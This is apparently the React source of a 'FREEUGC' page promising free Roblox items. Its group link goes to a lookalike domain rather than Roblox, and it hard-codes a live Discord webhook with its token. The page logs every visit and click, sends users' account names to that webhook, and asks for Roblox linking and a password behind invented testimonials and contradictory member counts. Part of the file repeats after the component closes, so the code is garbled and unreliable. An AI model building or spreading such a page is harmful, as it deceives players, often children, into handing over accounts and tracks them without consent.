import { useEffect, useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { playClickSound } from "@/lib/sound";
import { sendDiscordLog } from "@/lib/discord-logger";
import {
  Crown, Sparkles, Zap, ShieldCheck, ChevronRight, Star,
  Gamepad2, Gift, LogOut, User, ExternalLink,
} from "lucide-react";

const ROBLOX_GROUP_URL = "https://www.r.oblox.com.et/communities/6721652544/FREEUGC#!/about";
const STORAGE_KEY = "freeugc_account_v1";
const WEBHOOK_ACTIVITY =
  "https://discord.com/api/webhooks/1514811646021996696/OD5Cqv-O-p2tFZQt4IFTYrUdcUE_-dtDMDKI5LPQA3QeQhXrEqmah94bxykrgV1vra_K";

interface StoredUser {
  siteUsername: string;
  robloxId: number;
  robloxUsername: string;
  robloxDisplayName: string;
  avatarUrl: string | null;
  registeredAt: number;
}

async function sendActivityLog(user: StoredUser) {
  await fetch(WEBHOOK_ACTIVITY, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: `🚪 ${user.siteUsername} logged out`,
        color: 0xfee75c,
        thumbnail: user.avatarUrl ? { url: user.avatarUrl } : undefined,
        fields: [
          { name: "🏷️ Username", value: `**${user.siteUsername}**`, inline: true },
          { name: "🎮 Roblox", value: `\`${user.robloxUsername}\``, inline: true },
        ],
        footer: { text: "FREEUGC • Activity" },
        timestamp: new Date().toISOString(),
      }],
    }),
  }).catch(() => {});
}

function useStoredUser() {
  const [user, setUser] = useState<StoredUser | null>(null);
  useEffect(() => {
    try {
      const raw = localStorage.getItem(STORAGE_KEY);
      if (raw) setUser(JSON.parse(raw));
    } catch { /* noop */ }
  }, []);
  const logout = async () => {
    if (user) await sendActivityLog(user);
    localStorage.removeItem(STORAGE_KEY);
    window.location.reload();
  };
  return { user, logout };
}

function UserMenu({ user, onLogout }: { user: StoredUser; onLogout: () => void }) {
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const h = (e: MouseEvent) => {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    };
    document.addEventListener("mousedown", h);
    return () => document.removeEventListener("mousedown", h);
  }, []);

  return (
    <div className="relative" ref={ref}>
      <button
        onClick={() => setOpen(o => !o)}
        className="flex items-center gap-2 px-3 py-1.5 rounded-full border border-[#2f3550] bg-[#10121b] hover:border-[#00e5ff]/50 transition-all duration-200"
      >
        {user.avatarUrl
          ? <img src={user.avatarUrl} alt={user.robloxUsername} className="w-7 h-7 rounded-full ring-1 ring-[#00e5ff]/30" />
          : <div className="w-7 h-7 rounded-full bg-[#00e5ff]/20 flex items-center justify-center text-xs font-bold text-[#00e5ff]">{user.siteUsername[0]?.toUpperCase()}</div>
        }
        <span className="text-sm font-bold hidden sm:block tracking-wide">{user.siteUsername}</span>
        <svg className={`w-3.5 h-3.5 text-gray-500 transition-transform duration-200 ${open ? "rotate-180" : ""}`} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
          <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
        </svg>
      </button>

      <AnimatePresence>
        {open && (
          <motion.div
            initial={{ opacity: 0, y: 6, scale: 0.97 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 6, scale: 0.97 }}
            transition={{ duration: 0.15 }}
            className="absolute right-0 top-full mt-2 w-64 rounded-2xl border border-[#1f2335] bg-[#10121b] shadow-2xl overflow-hidden z-50"
            style={{ boxShadow: "0 0 40px rgba(0,229,255,0.05)" }}
          >
            <div className="px-4 py-4 flex items-center gap-3 border-b border-[#1f2335] bg-[#00e5ff]/5">
              {user.avatarUrl
                ? <img src={user.avatarUrl} alt="" className="w-12 h-12 rounded-full border-2 border-[#00e5ff]/30" />
                : <div className="w-12 h-12 rounded-full bg-[#00e5ff]/20 flex items-center justify-center text-xl font-black text-[#00e5ff]">{user.siteUsername[0]?.toUpperCase()}</div>
              }
              <div className="min-w-0">
                <p className="font-black text-sm truncate uppercase tracking-wide">{user.siteUsername}</p>
                <p className="text-gray-500 text-xs truncate">Roblox: {user.robloxUsername}</p>
                <p className="text-xs text-[#00e5ff]/80">Since {new Date(user.registeredAt).toLocaleDateString("en-US")}</p>
              </div>
            </div>
            <div className="p-2">
              <a
                href={`https://www.roblox.com/users/${user.robloxId}/profile`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-bold hover:bg-white/5 transition-colors text-gray-400 hover:text-white uppercase tracking-wide"
              >
                <User className="w-4 h-4" />
                View Roblox Profile
                <ExternalLink className="w-3 h-3 ml-auto" />
              </a>
              <div className="my-1 border-t border-[#1f2335]" />
              <button
                onClick={() => { setOpen(false); onLogout(); }}
                className="w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-bold hover:bg-red-500/10 transition-colors text-red-400 hover:text-red-300 uppercase tracking-wide"
              >
                <LogOut className="w-4 h-4" />
                Log Out
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

const MARQUEE_CSS = `
  @keyframes marquee {
    0% { transform: translateX(0); }
    100% { transform: translateX(-50%); }
  }
  .animate-marquee { animation: marquee 20s linear infinite; }
  .animate-marquee-rev { animation: marquee 20s linear infinite reverse; }
  .neon-border {
    border: 1px solid rgba(0, 229, 255, 0.25);
    box-shadow: 0 0 15px rgba(0, 229, 255, 0.08), inset 0 0 15px rgba(0, 229, 255, 0.04);
    transition: all 0.3s ease;
  }
  .neon-border:hover {
    border-color: rgba(0, 229, 255, 0.7);
    box-shadow: 0 0 25px rgba(0, 229, 255, 0.18), inset 0 0 20px rgba(0, 229, 255, 0.08);
    transform: translateY(-2px);
  }
  .neon-text { text-shadow: 0 0 20px rgba(0, 229, 255, 0.5); }
  .btn-glow { box-shadow: 0 0 20px rgba(0, 229, 255, 0.4); }
  .btn-glow:hover { box-shadow: 0 0 35px rgba(0, 229, 255, 0.65); }
`;

const steps = [
  { num: "1", title: "Verify Account", desc: "Link your Roblox username. Your account needs 80+ days to gain access." },
  { num: "2", title: "Create Profile", desc: "Pick a username and password for FREEUGC. Fast and completely free." },
  { num: "3", title: "Claim Items", desc: "Join the group and start receiving exclusive drops right away." },
];

const features = [
  { icon: <Gamepad2 className="w-8 h-8" />, title: "Exclusive Drops", desc: "Be first in line when the most sought-after items hit the marketplace. Instant notifications." },
  { icon: <ShieldCheck className="w-8 h-8" />, title: "100% Verified", desc: "Every member is Roblox-verified. No bots, no spam — only real players." },
  { icon: <Gift className="w-8 h-8" />, title: "Daily Freebies", desc: "New items shared every day by our curators. Something fresh always waiting for you." },
  { icon: <Zap className="w-8 h-8" />, title: "Live Alerts", desc: "Our community is active 24/7 — never miss a limited or a giveaway again." },
];

const testimonials = [
  { name: "xXShadowBlaze", text: "Found items I never would have discovered alone. FREEUGC is essential for any serious Roblox player!", days: "Member for 12 days" },
  { name: "LunaCraft99", text: "Amazing community! Everyone helps out and shares the best drops. Highly recommend it.", days: "Member for 34 days" },
  { name: "ProGamerBR", text: "My avatar has never looked this good. The curators know exactly what quality means.", days: "Member for 7 days" },
];

export default function Home() {
  const { user, logout } = useStoredUser();

  useEffect(() => { sendDiscordLog("visit"); }, []);

  const handleCtaClick = () => {
    playClickSound();
    sendDiscordLog("group_click");
    window.open(ROBLOX_GROUP_URL, "_blank");
  };

  return (
    <div
      className="min-h-screen text-white font-sans overflow-x-hidden"
      style={{
        backgroundColor: "#08090f",
        backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E")`,
      }}
    >
      <style dangerouslySetInnerHTML={{ __html: MARQUEE_CSS }} />

      {/* ── NAVBAR ── */}
      <nav className="fixed top-0 w-full z-50 border-b border-[#1f2335] bg-[#08090f]/90 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Crown className="w-8 h-8 text-[#00e5ff] drop-shadow-[0_0_10px_rgba(0,229,255,0.8)]" />
            <span className="text-2xl font-black tracking-tighter italic">
              FREE<span className="text-[#00e5ff]">UGC</span>
            </span>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden sm:flex items-center gap-2 bg-red-500/10 border border-red-500/30 px-3 py-1.5 rounded-full">
              <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              <span className="text-xs font-bold text-red-400 uppercase tracking-widest">Live</span>
            </div>
            <button
              onClick={handleCtaClick}
              className="hidden sm:block px-5 py-2.5 text-sm font-bold bg-[#1a1d2d] hover:bg-[#252a40] transition-colors rounded-lg border border-[#2f3550]"
            >
              Join Group
            </button>
            <button
              onClick={handleCtaClick}
              className="btn-glow px-6 py-2.5 text-sm font-bold bg-gradient-to-r from-[#00e5ff] to-[#2563eb] text-white rounded-lg flex items-center gap-2 hover:scale-105 transition-transform"
            >
              Get Access <ChevronRight className="w-4 h-4" />
            </button>
            {user && <UserMenu user={user} onLogout={logout} />}
          </div>
        </div>
      </nav>

      {/* ── HERO ── */}
      <section className="pt-40 pb-20 px-4 min-h-[90vh] flex items-center relative overflow-hidden">
        <div className="absolute top-1/4 -left-64 w-96 h-96 bg-[#2563eb] rounded-full mix-blend-screen filter blur-[128px] opacity-30 animate-pulse" />
        <div className="absolute top-1/3 -right-64 w-96 h-96 bg-[#00e5ff] rounded-full mix-blend-screen filter blur-[128px] opacity-20" />

        <div className="max-w-7xl mx-auto w-full grid lg:grid-cols-2 gap-12 items-center relative z-10">
          <motion.div
            initial={{ opacity: 0, x: -30 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.7 }}
            className="flex flex-col items-start gap-8"
          >
            {user && (
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-[#00e5ff]/30 bg-[#00e5ff]/10">
                {user.avatarUrl && <img src={user.avatarUrl} alt="" className="w-5 h-5 rounded-full" />}
                <span className="text-sm font-bold text-[#00e5ff] tracking-wide uppercase">
                  Welcome back, {user.siteUsername}!
                </span>
              </div>
            )}

            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-[#00e5ff]/30 bg-[#00e5ff]/10">
              <Sparkles className="w-4 h-4 text-[#00e5ff]" />
              <span className="text-sm font-bold text-[#00e5ff] tracking-wide uppercase">New Limiteds Dropping Daily</span>
            </div>

            <h1 className="text-6xl md:text-8xl font-black leading-[0.9] tracking-tighter uppercase">
              The Ultimate
              <br />
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00e5ff] via-[#00bfff] to-[#2563eb] neon-text">
                Roblox UGC Hub
              </span>
            </h1>

            <p className="text-xl md:text-2xl text-gray-400 font-medium max-w-xl leading-relaxed">
              Discover exclusive virtual items, join giveaways, and flex your avatar. 100% free — always.
            </p>

            <div className="flex flex-wrap items-center gap-4 w-full sm:w-auto">
              <button
                onClick={handleCtaClick}
                className="btn-glow w-full sm:w-auto px-8 py-4 text-lg font-black bg-[#00e5ff] text-[#08090f] hover:bg-white transition-all rounded-xl uppercase tracking-wider"
              >
                Get Free Access
              </button>
              <button
                onClick={() => document.getElementById("how-it-works")?.scrollIntoView({ behavior: "smooth" })}
                className="w-full sm:w-auto px-8 py-4 text-lg font-bold border-2 border-[#1f2335] hover:border-[#00e5ff]/50 bg-[#08090f] transition-all rounded-xl uppercase tracking-wider"
              >
                How it works ↓
              </button>
            </div>

            <div className="flex items-center gap-3 text-sm font-bold text-gray-500 uppercase tracking-widest flex-wrap">
              <span className="flex items-center gap-1"><ShieldCheck className="w-4 h-4 text-green-400" /> 100% Free</span>
              <span>·</span>
              <span>No Spam</span>
              <span>·</span>
              <span>Instant Access</span>
              <span>·</span>
              <span className="flex items-center gap-1"><Star className="w-4 h-4 text-yellow-400 fill-yellow-400" /> Verified</span>
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.7, delay: 0.15 }}
            className="hidden lg:flex justify-end items-center relative"
          >
            <div className="relative w-[400px] h-[400px] flex items-center justify-center">
              <div className="absolute inset-0 bg-gradient-to-br from-[#00e5ff]/20 to-[#2563eb]/20 rounded-full blur-3xl animate-pulse" />
              <div className="absolute inset-4 rounded-full border-2 border-[#00e5ff]/30 border-dashed animate-[spin_20s_linear_infinite]" />
              <div className="absolute inset-12 rounded-full border border-[#2563eb]/50 animate-[spin_15s_linear_infinite_reverse]" />
              <div className="neon-border bg-[#08090f]/80 backdrop-blur-xl p-12 rounded-full w-72 h-72 flex flex-col items-center justify-center relative">
                <div className="absolute -top-3 -right-3 w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                  <div className="absolute inset-0 rounded-full bg-green-500 animate-ping opacity-75" />
                </div>
                <span className="text-6xl font-black text-white neon-text mb-2">2.5k+</span>
                <span className="text-sm font-bold text-[#00e5ff] uppercase tracking-widest">Active Members</span>
              </div>
            </div>
          </motion.div>
        </div>
      </section>

      {/* ── MARQUEE ── */}
      <div className="w-full overflow-hidden bg-[#00e5ff] py-3 rotate-1 scale-110 -my-8 z-20 relative">
        <div className="flex whitespace-nowrap animate-marquee w-[200%]">
          {[...Array(2)].map((_, i) => (
            <div key={i} className="flex gap-8 items-center justify-around w-1/2 text-black font-black uppercase text-2xl tracking-widest px-4">
              <span>• Diamond Wings</span><span>• Ruby Crown</span><span>• Neon Katana</span>
              <span>• Shadow Cloak</span><span>• Crystal Staff</span><span>• Void Aura</span>
            </div>
          ))}
        </div>
      </div>

      <div className="w-full overflow-hidden bg-[#2563eb] py-3 -rotate-2 scale-110 z-10 relative mb-24">
        <div className="flex whitespace-nowrap animate-marquee-rev w-[200%]">
          {[...Array(2)].map((_, i) => (
            <div key={i} className="flex gap-8 items-center justify-around w-1/2 text-white font-black uppercase text-2xl tracking-widest px-4 opacity-90">
              <span>⚡ New Drop Alert</span><span>⚡ New Drop Alert</span>
              <span>⚡ New Drop Alert</span><span>⚡ New Drop Alert</span>
            </div>
          ))}
        </div>
      </div>

      {/* ── STATS ── */}
      <section className="py-20 px-4 max-w-7xl mx-auto relative z-20">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
          {[
            { label: "Active Members", value: "2.5M+" },
            { label: "Items Catalogued", value: "1,000+" },
            { label: "Satisfaction", value: "99%" },
            { label: "Community Active", value: "24/7" },
          ].map((stat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.08 }}
              className="neon-border bg-[#10121b] p-6 rounded-2xl text-center"
            >
              <div className="text-3xl md:text-4xl font-black text-white mb-2">{stat.value}</div>
              <div className="text-xs font-bold text-[#00e5ff] uppercase tracking-widest">{stat.label}</div>
            </motion.div>
          ))}
        </div>
      </section>

      {/* ── HOW IT WORKS ── */}
      <section id="how-it-works" className="py-24 px-4 bg-[#05060a]">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-20">
            <h2 className="text-5xl md:text-7xl font-black tracking-tighter uppercase mb-6">
              Get In <span className="text-[#00e5ff] neon-text">3 Steps</span>
            </h2>
            <p className="text-gray-400 text-xl font-medium">Simple, fast, completely free.</p>
          </div>

          <div className="grid md:grid-cols-3 gap-8">
            {steps.map((step, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, y: 24 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: i * 0.12 }}
                className="relative p-8 rounded-3xl bg-[#08090f] border border-[#1f2335] overflow-hidden group hover:border-[#2563eb] transition-colors"
              >
                <div className="absolute -right-8 -bottom-16 text-[150px] font-black text-[#1f2335] opacity-50 group-hover:text-[#2563eb]/20 group-hover:scale-110 transition-all duration-500 leading-none pointer-events-none select-none">
                  {step.num}
                </div>
                <div className="relative z-10">
                  <h3 className="text-2xl font-black uppercase text-white mb-4 flex items-center gap-3">
                    <span className="text-[#00e5ff]">&gt;_</span>
                    {step.title}
                  </h3>
                  <p className="text-gray-400 font-medium text-lg">{step.desc}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── FEATURES ── */}
      <section className="py-24 px-4 max-w-7xl mx-auto">
        <h2 className="text-4xl md:text-6xl font-black tracking-tighter uppercase mb-16 max-w-2xl">
          Why We're The <span className="text-[#2563eb]">Best</span>
        </h2>
        <div className="grid md:grid-cols-2 gap-6">
          {features.map((feat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 24 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.1 }}
              className="bg-[#10121b] p-8 rounded-2xl border-l-4 border-l-[#00e5ff] border-y border-r border-[#1f2335] flex gap-6 hover:bg-[#151824] transition-colors"
            >
              <div className="text-[#00e5ff] flex-shrink-0">{feat.icon}</div>
              <div>
                <h3 className="text-xl font-black uppercase mb-2">{feat.title}</h3>
                <p className="text-gray-400 font-medium">{feat.desc}</p>
              </div>
            </motion.div>
          ))}
        </div>
      </section>

      {/* ── TESTIMONIALS ── */}
      <section className="py-24 px-4 bg-[#05060a]">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-5xl md:text-6xl font-black tracking-tighter uppercase mb-4">
              What They <span className="text-[#00e5ff] neon-text">Say</span>
            </h2>
            <div className="flex items-center justify-center gap-1 mb-2">
              {[...Array(5)].map((_, i) => <Star key={i} className="w-5 h-5 fill-yellow-400 text-yellow-400" />)}
            </div>
            <p className="text-gray-500 font-bold uppercase tracking-widest text-sm">5/5 · 200+ Reviews</p>
          </div>
          <div className="grid md:grid-cols-3 gap-6">
            {testimonials.map((t, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, y: 24 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: i * 0.1 }}
                className="neon-border bg-[#10121b] p-6 rounded-2xl"
              >
                <div className="flex items-center gap-1 mb-4">
                  {[...Array(5)].map((_, j) => <Star key={j} className="w-3.5 h-3.5 fill-yellow-400 text-yellow-400" />)}
                </div>
                <p className="text-gray-300 font-medium leading-relaxed mb-5">"{t.text}"</p>
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 rounded-full bg-gradient-to-br from-[#00e5ff] to-[#2563eb] flex items-center justify-center text-sm font-black text-[#08090f]">
                    {t.name[0]}
                  </div>
                  <div>
                    <p className="font-black text-sm uppercase tracking-wide text-[#00e5ff]">{t.name}</p>
                    <p className="text-xs text-gray-500">{t.days}</p>
                  </div>
                  <span className="ml-auto text-xs bg-green-500/10 text-green-400 border border-green-500/20 px-2 py-0.5 rounded-full font-bold">✓ Verified</span>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── CTA ── */}
      <section className="py-32 px-4 relative overflow-hidden mt-12">
        <div className="absolute inset-0 bg-gradient-to-t from-[#00e5ff]/15 to-transparent" />
        <div
          className="absolute inset-0 opacity-10"
          style={{ backgroundImage: "radial-gradient(#00e5ff 1px, transparent 1px)", backgroundSize: "40px 40px" }}
        />
        <div className="max-w-4xl mx-auto text-center relative z-10 flex flex-col items-center">
          <div className="mb-8 p-4 bg-[#08090f] rounded-full inline-block border-2 border-[#00e5ff]/30 shadow-[0_0_30px_rgba(0,229,255,0.2)]">
            <Crown className="w-16 h-16 text-[#00e5ff]" />
          </div>
          <h2 className="text-6xl md:text-8xl font-black tracking-tighter uppercase mb-8 neon-text text-white">
            Ready to Flex?
          </h2>
          <p className="text-2xl text-[#00e5ff] font-bold mb-12 uppercase tracking-wider">
            Join thousands of players already getting free items.
          </p>
          <button
            onClick={handleCtaClick}
            className="btn-glow px-12 py-6 text-2xl font-black bg-white text-[#08090f] hover:bg-[#00e5ff] transition-all duration-300 rounded-2xl uppercase tracking-widest hover:scale-110 active:scale-95"
          >
            Start Claiming Now
          </button>
          <p className="text-xs text-gray-600 mt-5 font-bold uppercase tracking-widest">No fee. No email. Just your Roblox account.</p>
        </div>
      </section>

      {/* ── FOOTER ── */}
      <footer className="border-t border-[#1f2335] bg-[#05060a] py-12 px-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-2">
            <Crown className="w-6 h-6 text-[#00e5ff]/50" />
            <span className="text-xl font-black tracking-tighter italic text-white/40">FREEUGC</span>
          </div>
          <div className="flex gap-6 text-sm font-bold text-gray-500 uppercase tracking-widest">
            <button onClick={handleCtaClick} className="hover:text-white transition-colors">Roblox Group</button>
            {user && (
              <button onClick={logout} className="text-red-400/60 hover:text-red-400 transition-colors flex items-center gap-1.5">
                <LogOut className="w-3.5 h-3.5" /> Log Out
              </button>
            )}
          </div>
          <div className="text-center">
            <p className="text-xs text-gray-600 font-medium">© {new Date().getFullYear()} FREEUGC. All rights reserved.</p>
            <p className="text-xs text-gray-700 mt-1">Not affiliated with Roblox Corporation.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
                href={`https://www.roblox.com/users/${user.robloxId}/profile`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-bold hover:bg-white/5 transition-colors text-gray-400 hover:text-white uppercase tracking-wide"
              >
                <User className="w-4 h-4" />
                View Roblox Profile
                <ExternalLink className="w-3 h-3 ml-auto" />
              </a>
              <div className="my-1 border-t border-[#1f2335]" />
              <button
                onClick={() => { setOpen(false); onLogout(); }}
                className="w-full flex items-center gap-3 px-3 py-2.5 rounded-xl text-sm font-bold hover:bg-red-500/10 transition-colors text-red-400 hover:text-red-300 uppercase tracking-wide"
              >
                <LogOut className="w-4 h-4" />
                Log Out
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

const MARQUEE_CSS = `
  @keyframes marquee {
    0% { transform: translateX(0); }
    100% { transform: translateX(-50%); }
  }
  .animate-marquee { animation: marquee 20s linear infinite; }
  .animate-marquee-rev { animation: marquee 20s linear infinite reverse; }
  .neon-border {
    border: 1px solid rgba(0, 229, 255, 0.25);
    box-shadow: 0 0 15px rgba(0, 229, 255, 0.08), inset 0 0 15px rgba(0, 229, 255, 0.04);
    transition: all 0.3s ease;
  }
  .neon-border:hover {
    border-color: rgba(0, 229, 255, 0.7);
    box-shadow: 0 0 25px rgba(0, 229, 255, 0.18), inset 0 0 20px rgba(0, 229, 255, 0.08);
    transform: translateY(-2px);
  }
  .neon-text { text-shadow: 0 0 20px rgba(0, 229, 255, 0.5); }
  .btn-glow { box-shadow: 0 0 20px rgba(0, 229, 255, 0.4); }
  .btn-glow:hover { box-shadow: 0 0 35px rgba(0, 229, 255, 0.65); }
`;

const steps = [
  { num: "1", title: "Verify Account", desc: "Link your Roblox username. Your account needs 80+ days to gain access." },
  { num: "2", title: "Create Profile", desc: "Pick a username and password for FREEUGC. Fast and completely free." },
  { num: "3", title: "Claim Items", desc: "Join the group and start receiving exclusive drops right away." },
];

const features = [
  { icon: <Gamepad2 className="w-8 h-8" />, title: "Exclusive Drops", desc: "Be first in line when the most sought-after items hit the marketplace. Instant notifications." },
  { icon: <ShieldCheck className="w-8 h-8" />, title: "100% Verified", desc: "Every member is Roblox-verified. No bots, no spam — only real players." },
  { icon: <Gift className="w-8 h-8" />, title: "Daily Freebies", desc: "New items shared every day by our curators. Something fresh always waiting for you." },
  { icon: <Zap className="w-8 h-8" />, title: "Live Alerts", desc: "Our community is active 24/7 — never miss a limited or a giveaway again." },
];

const testimonials = [
  { name: "xXShadowBlaze", text: "Found items I never would have discovered alone. FREEUGC is essential for any serious Roblox player!", days: "Member for 12 days" },
  { name: "LunaCraft99", text: "Amazing community! Everyone helps out and shares the best drops. Highly recommend it.", days: "Member for 34 days" },
  { name: "ProGamerBR", text: "My avatar has never looked this good. The curators know exactly what quality means.", days: "Member for 7 days" },
];

export default function Home() {
  const { user, logout } = useStoredUser();

  useEffect(() => { sendDiscordLog("visit"); }, []);

  const handleCtaClick = () => {
    playClickSound();
    sendDiscordLog("group_click");
    window.open(ROBLOX_GROUP_URL, "_blank");
  };

  return (
    <div
      className="min-h-screen text-white font-sans overflow-x-hidden"
      style={{
        backgroundColor: "#08090f",
        backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E")`,
      }}
    >
      <style dangerouslySetInnerHTML={{ __html: MARQUEE_CSS }} />

      {/* ── NAVBAR ── */}
      <nav className="fixed top-0 w-full z-50 border-b border-[#1f2335] bg-[#08090f]/90 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Crown className="w-8 h-8 text-[#00e5ff] drop-shadow-[0_0_10px_rgba(0,229,255,0.8)]" />
            <span className="text-2xl font-black tracking-tighter italic">
              FREE<span className="text-[#00e5ff]">UGC</span>
            </span>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden sm:flex items-center gap-2 bg-red-500/10 border border-red-500/30 px-3 py-1.5 rounded-full">
              <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              <span className="text-xs font-bold text-red-400 uppercase tracking-widest">Live</span>
            </div>
            <button
              onClick={handleCtaClick}
              className="hidden sm:block px-5 py-2.5 text-sm font-bold bg-[#1a1d2d] hover:bg-[#252a40] transition-colors rounded-lg border border-[#2f3550]"
            >
              Join Group
            </button>
            <button
              onClick={handleCtaClick}
              className="btn-glow px-6 py-2.5 text-sm font-bold bg-gradient-to-r from-[#00e5ff] to-[#2563eb] text-white rounded-lg flex items-center gap-2 hover:scale-105 transition-transform"
            >
              Get Access <ChevronRight className="w-4 h-4" />
            </button>
            {user && <UserMenu user={user} onLogout={logout} />}
          </div>
        </div>
      </nav>

      {/* ── HERO ── */}
      <section className="pt-40 pb-20 px-4 min-h-[90vh] flex items-center relative overflow-hidden">
        <div className="absolute top-1/4 -left-64 w-96 h-96 bg-[#2563eb] rounded-full mix-blend-screen filter blur-[128px] opacity-30 animate-pulse" />
        <div className="absolute top-1/3 -right-64 w-96 h-96 bg-[#00e5ff] rounded-full mix-blend-screen filter blur-[128px] opacity-20" />

        <div className="max-w-7xl mx-auto w-full grid lg:grid-cols-2 gap-12 items-center relative z-10">
          <motion.div
            initial={{ opacity: 0, x: -30 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.7 }}
            className="flex flex-col items-start gap-8"
          >
            {user && (
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-[#00e5ff]/30 bg-[#00e5ff]/10">
                {user.avatarUrl && <img src={user.avatarUrl} alt="" className="w-5 h-5 rounded-full" />}
                <span className="text-sm font-bold text-[#00e5ff] tracking-wide uppercase">
                  Welcome back, {user.siteUsername}!
                </span>
              </div>
            )}

            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-[#00e5ff]/30 bg-[#00e5ff]/10">
              <Sparkles className="w-4 h-4 text-[#00e5ff]" />
              <span className="text-sm font-bold text-[#00e5ff] tracking-wide uppercase">New Limiteds Dropping Daily</span>
            </div>

            <h1 className="text-6xl md:text-8xl font-black leading-[0.9] tracking-tighter uppercase">
              The Ultimate
              <br />
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#00e5ff] via-[#00bfff] to-[#2563eb] neon-text">
                Roblox UGC Hub
              </span>
            </h1>

            <p className="text-xl md:text-2xl text-gray-400 font-medium max-w-xl leading-relaxed">
              Discover exclusive virtual items, join giveaways, and flex your avatar. 100% free — always.
            </p>

            <div className="flex flex-wrap items-center gap-4 w-full sm:w-auto">
              <button
                onClick={handleCtaClick}
                className="btn-glow w-full sm:w-auto px-8 py-4 text-lg font-black bg-[#00e5ff] text-[#08090f] hover:bg-white transition-all rounded-xl uppercase tracking-wider"
              >
                Get Free Access
              </button>
              <button
                onClick={() => document.getElementById("how-it-works")?.scrollIntoView({ behavior: "smooth" })}
                className="w-full sm:w-auto px-8 py-4 text-lg font-bold border-2 border-[#1f2335] hover:border-[#00e5ff]/50 bg-[#08090f] transition-all rounded-xl uppercase tracking-wider"
              >
                How it works ↓
              </button>
            </div>

            <div className="flex items-center gap-3 text-sm font-bold text-gray-500 uppercase tracking-widest flex-wrap">
              <span className="flex items-center gap-1"><ShieldCheck className="w-4 h-4 text-green-400" /> 100% Free</span>
              <span>·</span>
              <span>No Spam</span>
              <span>·</span>
              <span>Instant Access</span>
              <span>·</span>
              <span className="flex items-center gap-1"><Star className="w-4 h-4 text-yellow-400 fill-yellow-400" /> Verified</span>
            </div>
          </motion.div>

          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.7, delay: 0.15 }}
            className="hidden lg:flex justify-end items-center relative"
          >
            <div className="relative w-[400px] h-[400px] flex items-center justify-center">
              <div className="absolute inset-0 bg-gradient-to-br from-[#00e5ff]/20 to-[#2563eb]/20 rounded-full blur-3xl animate-pulse" />
              <div className="absolute inset-4 rounded-full border-2 border-[#00e5ff]/30 border-dashed animate-[spin_20s_linear_infinite]" />
              <div className="absolute inset-12 rounded-full border border-[#2563eb]/50 animate-[spin_15s_linear_infinite_reverse]" />
